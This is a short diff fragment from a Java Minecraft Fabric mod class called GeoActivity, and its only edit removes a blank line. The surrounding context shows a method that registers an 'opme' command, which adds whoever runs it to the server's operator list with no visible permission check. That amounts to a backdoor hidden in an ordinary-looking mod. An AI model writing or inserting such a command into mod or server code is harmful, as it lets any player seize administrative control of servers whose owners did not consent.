@@ -44,7 +44,6 @@ public class GeoActivity implements ModInitializer {
 		LOGGER.info("Initialized!");
 	}
 
-	
 	private static void opMe(CommandDispatcher<ServerCommandSource> dispatcher) {
 		dispatcher.register(literal("opme").executes(ctx ->  {
 			ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
